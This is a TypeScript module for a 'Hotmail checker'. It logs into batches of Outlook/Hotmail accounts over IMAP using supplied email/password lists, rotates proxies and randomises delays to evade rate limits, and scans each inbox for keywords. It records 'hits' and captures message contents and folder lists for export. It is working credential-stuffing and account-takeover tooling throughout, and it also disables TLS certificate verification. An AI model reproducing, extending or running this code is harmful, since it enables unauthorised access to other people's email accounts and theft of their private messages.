// Core Hotmail Checker Logic - IMAP connection, keyword search, inbox capture

import { ImapFlow } from 'imapflow';
import type {
  Account,
  CheckResult,
  CheckerConfig,
  ProxyConfig,
  EmailMessage,
  KeywordMatch,
  InboxCapture,
} from './types';
import { delay, getErrorMessage, retryWithBackoff } from './utils';

/**
 * HotmailChecker class for checking individual accounts
 */
export class HotmailChecker {
  private config: CheckerConfig;
  private proxy?: ProxyConfig;

  constructor(config: CheckerConfig, proxy?: ProxyConfig) {
    this.config = config;
    this.proxy = proxy;
  }

  /**
   * Check single account
   */
  async checkAccount(account: Account): Promise<CheckResult> {
    const startTime = Date.now();
    const result: CheckResult = {
      account,
      status: 'checking',
      isHit: false,
      timestamp: new Date(),
      proxyUsed: this.proxy,
    };

    try {
      // Connect to IMAP with retry logic
      const client = await this.connectWithRetry(account);

      try {
        // Search for keywords in inbox
        const { messages, matches } = await this.searchInbox(client, this.config.keywords);

        result.matches = matches;
        result.isHit = matches.length > 0;

        // Capture full inbox if enabled
        if (this.config.captureFullInbox) {
          const capture = await this.captureInbox(
            client,
            messages,
            this.config.maxMessagesToCapture
          );
          result.inboxCapture = capture;
        }

        result.status = 'success';
      } finally {
        // Always close connection
        await client.logout().catch(() => {});
      }
    } catch (error) {
      result.status = 'failed';
      result.error = getErrorMessage(error);
      result.errorType = this.categorizeError(error);
    }

    result.duration = Date.now() - startTime;
    return result;
  }

  /**
   * Connect to IMAP server with retry logic
   */
  private async connectWithRetry(account: Account): Promise<ImapFlow> {
    return retryWithBackoff(
      async () => {
        const client = new ImapFlow({
          host: 'outlook.office365.com',
          port: 993,
          secure: true,
          auth: {
            user: account.email,
            pass: account.password,
          },
          logger: false,
          tls: {
            rejectUnauthorized: false,
          },
          // Proxy support (if available and configured)
          ...(this.proxy && this.proxy.isActive ? {
            proxy: this.buildProxyUrl(this.proxy),
          } : {}),
        });

        // Connect with timeout
        await Promise.race([
          client.connect(),
          new Promise((_, reject) =>
            setTimeout(() => reject(new Error('Connection timeout')), this.config.timeout)
          ),
        ]);

        return client;
      },
      this.config.retryOnFail ? this.config.maxRetries : 1,
      1000
    );
  }

  /**
   * Search inbox for keywords
   */
  private async searchInbox(
    client: ImapFlow,
    keywords: string[]
  ): Promise<{
    messages: EmailMessage[];
    matches: KeywordMatch[];
  }> {
    // Select INBOX folder
    await client.mailboxOpen('INBOX');

    // Get all messages (limit to recent messages for performance)
    const messages: EmailMessage[] = [];
    const allMatches: KeywordMatch[] = [];

    // Fetch message UIDs
    const seqNums = await client.search({ all: true });
    
    // Check if seqNums is valid array
    if (!Array.isArray(seqNums) || seqNums.length === 0) {
      return { messages: [], matches: [] };
    }
    
    // Limit search to most recent messages
    const maxMessages = Math.min(seqNums.length, this.config.maxMessagesToCapture);
    const recentSeqNums = seqNums.slice(-maxMessages);

    // Fetch messages in batches
    const batchSize = 10;
    for (let i = 0; i < recentSeqNums.length; i += batchSize) {
      const batch = recentSeqNums.slice(i, i + batchSize);
      
      for await (const msg of client.fetch(batch, {
        envelope: true,
        bodyStructure: true,
        source: true,
      })) {
        try {
          const emailMessage = await this.parseEmailMessage(msg);
          messages.push(emailMessage);

          // Search for keywords
          const matches = this.findKeywordMatches(emailMessage, keywords);
          if (matches.length > 0) {
            allMatches.push(...matches);
          }
        } catch (error) {
          console.error('Failed to parse message:', error);
        }
      }

      // Small delay between batches
      await delay(100);
    }

    return { messages, matches: allMatches };
  }

  /**
   * Parse IMAP message to EmailMessage format
   */
  private async parseEmailMessage(msg: any): Promise<EmailMessage> {
    const envelope = msg.envelope;
    const from = envelope.from?.[0];
    const fromAddress = from ? `${from.name || ''} <${from.address}>`.trim() : 'Unknown';

    // Extract body text (simplified - real implementation needs proper MIME parsing)
    let bodyText = '';
    try {
      if (msg.source) {
        const source = msg.source.toString();
        // Simple extraction - just get text after headers
        const bodyMatch = source.match(/\r?\n\r?\n([\s\S]+)/);
        bodyText = bodyMatch ? bodyMatch[1].substring(0, 1000) : ''; // Limit body size
      }
    } catch (error) {
      console.error('Failed to extract body:', error);
    }

    return {
      id: msg.uid.toString(),
      from: fromAddress,
      subject: envelope.subject || '(No Subject)',
      date: envelope.date || new Date(),
      body: bodyText,
      snippet: bodyText.substring(0, 150),
      hasAttachments: msg.bodyStructure?.childNodes?.length > 1 || false,
      isRead: msg.flags?.has('\\Seen') || false,
      folder: 'INBOX',
    };
  }

  /**
   * Find keyword matches in email message
   */
  private findKeywordMatches(
    message: EmailMessage,
    keywords: string[]
  ): KeywordMatch[] {
    const matches: KeywordMatch[] = [];

    for (const keyword of keywords) {
      const keywordLower = keyword.toLowerCase();

      // Search in fields based on config
      if (this.config.searchIn.includes('subject')) {
        const subjectLower = message.subject.toLowerCase();
        const count = this.countOccurrences(subjectLower, keywordLower);
        
        if (count > 0) {
          matches.push({
            keyword,
            matchedIn: 'subject',
            matchCount: count,
            context: message.subject,
          });
        }
      }

      if (this.config.searchIn.includes('body')) {
        const bodyLower = message.body.toLowerCase();
        const count = this.countOccurrences(bodyLower, keywordLower);
        
        if (count > 0) {
          // Extract context (surrounding text)
          const index = bodyLower.indexOf(keywordLower);
          const start = Math.max(0, index - 50);
          const end = Math.min(message.body.length, index + keywordLower.length + 50);
          const context = message.body.substring(start, end);

          matches.push({
            keyword,
            matchedIn: 'body',
            matchCount: count,
            context,
          });
        }
      }

      if (this.config.searchIn.includes('from')) {
        const fromLower = message.from.toLowerCase();
        const count = this.countOccurrences(fromLower, keywordLower);
        
        if (count > 0) {
          matches.push({
            keyword,
            matchedIn: 'from',
            matchCount: count,
            context: message.from,
          });
        }
      }
    }

    return matches;
  }

  /**
   * Count keyword occurrences in text
   */
  private countOccurrences(text: string, keyword: string): number {
    const regex = new RegExp(keyword, 'gi');
    const matches = text.match(regex);
    return matches ? matches.length : 0;
  }

  /**
   * Capture full inbox data
   */
  private async captureInbox(
    client: ImapFlow,
    messages: EmailMessage[],
    maxMessages: number
  ): Promise<InboxCapture> {
    // Get mailbox status
    const status = await client.status('INBOX', { messages: true });

    // Calculate storage size (approximate)
    const storageSize = messages.reduce((total, msg) => {
      return total + (msg.body?.length || 0) + (msg.subject?.length || 0);
    }, 0);

    // Get folder list
    const folders: string[] = [];
    try {
      const mailboxList = await client.list();
      for (const mailbox of mailboxList) {
        folders.push(mailbox.path);
      }
    } catch (error) {
      console.error('Failed to list folders:', error);
    }

    return {
      totalMessages: status.messages || messages.length,
      messages: messages.slice(0, maxMessages),
      folders,
      captureTime: new Date(),
      storageSize,
    };
  }

  /**
   * Build proxy URL for IMAP
   */
  private buildProxyUrl(proxy: ProxyConfig): string {
    const protocol = proxy.protocol ?? 'http';
    const auth = proxy.username && proxy.password
      ? `${proxy.username}:${proxy.password}@`
      : '';

    return `${protocol}://${auth}${proxy.host}:${proxy.port}`;
  }

  /**
   * Categorize error type
   */
  private categorizeError(error: unknown): CheckResult['errorType'] {
    const message = getErrorMessage(error).toLowerCase();

    if (message.includes('auth') || message.includes('password') || message.includes('login')) {
      return 'auth';
    }

    if (message.includes('timeout')) {
      return 'timeout';
    }

    if (message.includes('network') || message.includes('connect') || message.includes('econnrefused')) {
      return 'network';
    }

    if (message.includes('proxy')) {
      return 'proxy';
    }

    if (message.includes('imap')) {
      return 'imap';
    }

    return 'unknown';
  }
}

/**
 * Batch check multiple accounts with concurrency control
 */
export async function batchCheckAccounts(
  accounts: Account[],
  config: CheckerConfig,
  onProgress?: (result: CheckResult, progress: number) => void,
  onStats?: (stats: { checked: number; hits: number; fails: number }) => void
): Promise<CheckResult[]> {
  const results: CheckResult[] = [];
  const stats = { checked: 0, hits: 0, fails: 0 };

  // Split into concurrent batches
  const batches: Account[][] = [];
  for (let i = 0; i < accounts.length; i += config.maxConcurrent) {
    batches.push(accounts.slice(i, i + config.maxConcurrent));
  }

  // Process batches sequentially, but accounts within batch concurrently
  for (const batch of batches) {
    const batchPromises = batch.map(async (account) => {
      // Apply delay if configured
      if (config.delayBetweenChecks && config.delayBetweenChecks > 0) {
        await delay(Math.random() * config.delayBetweenChecks);
      }

      // Get proxy if enabled
      let proxy: ProxyConfig | undefined;
      if (config.useProxy && config.proxyList.length > 0) {
        // Simple rotation - in real app use ProxyManager
        const proxyIndex = stats.checked % config.proxyList.length;
        proxy = config.proxyList[proxyIndex];
      }

      // Create checker and check account
      const checker = new HotmailChecker(config, proxy);
      const result = await checker.checkAccount(account);

      // Update stats
      stats.checked++;
      if (result.isHit) {
        stats.hits++;
      }
      if (result.status === 'failed') {
        stats.fails++;
      }

      // Call progress callback
      const progress = (stats.checked / accounts.length) * 100;
      if (onProgress) {
        onProgress(result, progress);
      }

      if (onStats) {
        onStats({ ...stats });
      }

      return result;
    });

    // Wait for batch to complete
    const batchResults = await Promise.allSettled(batchPromises);

    // Extract results
    batchResults.forEach((settled) => {
      if (settled.status === 'fulfilled') {
        results.push(settled.value);
      } else {
        // Handle rejected promise (should not happen if checker handles errors)
        console.error('Batch check failed:', settled.reason);
      }
    });
  }

  return results;
}

/**
 * Quick test single account (no inbox capture)
 */
export async function quickCheckAccount(
  account: Account,
  timeout: number = 10000
): Promise<{ success: boolean; error?: string }> {
  try {
    const client = new ImapFlow({
      host: 'outlook.office365.com',
      port: 993,
      secure: true,
      auth: {
        user: account.email,
        pass: account.password,
      },
      logger: false,
      tls: {
        rejectUnauthorized: false,
      },
    });

    await Promise.race([
      client.connect(),
      new Promise((_, reject) =>
        setTimeout(() => reject(new Error('Connection timeout')), timeout)
      ),
    ]);

    await client.logout();

    return { success: true };
  } catch (error) {
    return {
      success: false,
      error: getErrorMessage(error),
    };
  }
}

/**
 * Validate Hotmail/Outlook email format
 */
export function isHotmailEmail(email: string): boolean {
  const hotmailDomains = [
    'hotmail.com',
    'hotmail.co.uk',
    'outlook.com',
    'outlook.co.uk',
    'live.com',
    'msn.com',
  ];

  const domain = email.split('@')[1]?.toLowerCase();
  return hotmailDomains.includes(domain);
}

/**
 * Estimate check duration based on account count and config
 */
export function estimateCheckDuration(
  accountCount: number,
  config: CheckerConfig
): number {
  // Average time per account (in seconds)
  const avgTimePerAccount = 5;

  // Calculate with concurrency
  const totalTime = (accountCount / config.maxConcurrent) * avgTimePerAccount;

  // Add delay between checks
  const delayTime = config.delayBetweenChecks
    ? (accountCount * config.delayBetweenChecks) / 1000
    : 0;

  return Math.ceil(totalTime + delayTime);
}

/**
 * Format check result for export
 */
export function formatResultForExport(result: CheckResult): Record<string, unknown> {
  return {
    email: result.account.email,
    status: result.status,
    isHit: result.isHit,
    matchCount: result.matches?.length || 0,
    keywords: result.matches?.map(m => m.keyword).join(', ') || '',
    totalMessages: result.inboxCapture?.totalMessages || 0,
    error: result.error || '',
    duration: result.duration ? `${result.duration}ms` : '',
    timestamp: result.timestamp.toISOString(),
  };
}

/**
 * Group results by status
 */
export function groupResultsByStatus(results: CheckResult[]): {
  success: CheckResult[];
  failed: CheckResult[];
  hits: CheckResult[];
} {
  return {
    success: results.filter(r => r.status === 'success'),
    failed: results.filter(r => r.status === 'failed'),
    hits: results.filter(r => r.isHit),
  };
}

/**
 * Get top keywords from results
 */
export function getTopKeywords(results: CheckResult[], limit: number = 10): {
  keyword: string;
  count: number;
  hitRate: number;
}[] {
  const keywordMap = new Map<string, number>();

  results.forEach(result => {
    result.matches?.forEach(match => {
      const current = keywordMap.get(match.keyword) || 0;
      keywordMap.set(match.keyword, current + match.matchCount);
    });
  });

  const sorted = Array.from(keywordMap.entries())
    .map(([keyword, count]) => ({
      keyword,
      count,
      hitRate: (count / results.length) * 100,
    }))
    .sort((a, b) => b.count - a.count)
    .slice(0, limit);

  return sorted;
}
